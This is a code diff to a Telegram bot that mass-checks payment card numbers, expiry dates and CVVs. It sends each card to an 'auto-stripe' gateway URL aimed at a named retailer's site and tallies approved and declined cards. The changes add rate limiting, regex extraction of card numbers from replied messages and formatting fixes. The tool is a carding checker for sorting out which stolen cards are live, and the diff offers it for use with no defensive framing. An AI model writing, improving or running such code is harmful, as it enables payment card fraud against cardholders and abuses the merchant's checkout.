@@ -1615,7 +1615,7 @@ import asyncio
 import aiohttp
 import time
 import re
-from telegram import Update
+from telegram import Update, Message
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from telegram.error import TelegramError
 
@@ -1623,52 +1623,76 @@ from telegram.error import TelegramError
 API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
 CONCURRENCY = 5
 UPDATE_INTERVAL = 3  # seconds
+RATE_LIMIT_SECONDS = 5
+user_last_command_time = {}
 
 def escape_md(text: str) -> str:
     """Escape all special characters for MarkdownV2."""
     return re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', text)
 
+def extract_cards_from_text(text: str) -> list[str]:
+    """Extracts card-like strings from a given text."""
+    # This regex looks for patterns like:
+    # 16-digit number, possibly with spaces, followed by | and other numbers.
+    return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)
+
 async def check_card(session, card: str):
     """Send card to API and return formatted result and status type."""
     try:
-        async with session.get(API_URL_TEMPLATE + card, timeout=15) as resp:
+        async with session.get(API_URL_TEMPLATE + card, timeout=50) as resp:
             data = await resp.json()
         status = data.get("status", "Unknown")
 
-        # Consistent status handling with lowercase and correct emojis.
         if status.lower() == "approved":
-            # Approved status: bold, italic, and green checkmark
             formatted_status = f"*_{escape_md(status)} ✅_*"
             return f"`{escape_md(card)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {formatted_status}", "approved"
         elif status.lower() == "unknown":
-            # Unknown status: italic and red cross
-            formatted_status = f"_{escape_md(status)}_ 🚫"
+            formatted_status = f"_{escape_md(status)} 🚫_"
             return f"`{escape_md(card)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {formatted_status}", "declined"
         else:
-            # Declined or other status: italic and red cross
-            formatted_status = f"_{escape_md(status)}_ ❌"
+            formatted_status = f"_{escape_md(status)} ❌_"
             return f"`{escape_md(card)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {formatted_status}", "declined"
     except (aiohttp.ClientError, asyncio.TimeoutError):
-        # Handle network-related errors gracefully.
-        formatted_status = "_Error: Network_ ❌"
+        formatted_status = "*_Error: Network ❌_*"
         return f"`{escape_md(card)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {formatted_status}", "error"
     except Exception:
-        # Catch any other unexpected errors.
-        formatted_status = "_Error: Unknown_ ❌"
+        formatted_status = "*_Error: Unknown ❌_*"
         return f"`{escape_md(card)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {formatted_status}", "error"
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text("Usage: /mchk card1|mm|yy|cvv card2|mm|yy|cvv ...")
+    user_id = update.effective_user.id
+    current_time = time.time()
+
+    # Rate-limiting check
+    if user_id in user_last_command_time and (current_time - user_last_command_time[user_id]) < RATE_LIMIT_SECONDS:
+        remaining_time = round(RATE_LIMIT_SECONDS - (current_time - user_last_command_time[user_id]), 2)
+        await update.message.reply_text(f"Please wait `{remaining_time}` seconds before using this command again.", parse_mode="MarkdownV2")
+        return
+    
+    # Update last command time for the user
+    user_last_command_time[user_id] = current_time
+
+    cards = []
+    if context.args:
+        cards = context.args
+    elif update.message.reply_to_message:
+        replied_text = update.message.reply_to_message.text
+        if replied_text:
+            cards = extract_cards_from_text(replied_text)
+    
+    if not cards:
+        await update.message.reply_text("Usage: `/mchk card1|mm|yy|cvv ...` or reply to a message containing cards.", parse_mode="MarkdownV2")
         return
 
-    cards = context.args
     total = len(cards)
+    if total == 0:
+        await update.message.reply_text("No cards found in the message.", parse_mode="MarkdownV2")
+        return
+
     results = ["Pending..."] * total
     counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
     start_time = time.time()
     separator = "──────── ⸙ ─────────"
-    # Header for the results section
     results_header = "𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸"
 
     try:
@@ -1692,18 +1716,20 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tasks = [worker(i, c) for i, c in enumerate(cards)]
         pending = tasks
 
-        # Update loop while tasks are running
+        # Background update loop
         while pending:
             done, pending = await asyncio.wait(pending, timeout=UPDATE_INTERVAL, return_when=asyncio.FIRST_COMPLETED)
             
             elapsed = round(time.time() - start_time, 2)
+            elapsed_escaped = escape_md(str(elapsed))
+            
             header = (
                 f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total}\n"
                 f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{counters['checked']}\n"
                 f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{counters['approved']}\n"
                 f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{counters['declined']}\n"
                 f"✘ 𝐄𝐫𝐫𝐨𝐫↣{counters['error']}\n"
-                f"✘ 𝐓𝐢𝐦𝐞↣{elapsed}s"
+                f"✘ 𝐓𝐢𝐦𝐞↣{elapsed_escaped}s"
             )
 
             content = f"{escape_md(header)}\n\n{escape_md(results_header)}\n{escape_md(separator)}\n" + f"\n{escape_md(separator)}\n".join(results)
@@ -1715,13 +1741,15 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Final update after all tasks complete
     elapsed = round(time.time() - start_time, 2)
+    elapsed_escaped = escape_md(str(elapsed))
+    
     header = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total}\n"
         f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{counters['checked']}\n"
         f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{counters['approved']}\n"
         f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{counters['declined']}\n"
         f"✘ 𝐄𝐫𝐫𝐨𝐫↣{counters['error']}\n"
-        f"✘ 𝐓𝐢𝐦𝐞↣{elapsed}s"
+        f"✘ 𝐓𝐢𝐦𝐞↣{elapsed_escaped}s"
     )
 
     content = f"{escape_md(header)}\n\n{escape_md(results_header)}\n{escape_md(separator)}\n" + f"\n{escape_md(separator)}\n".join(results)
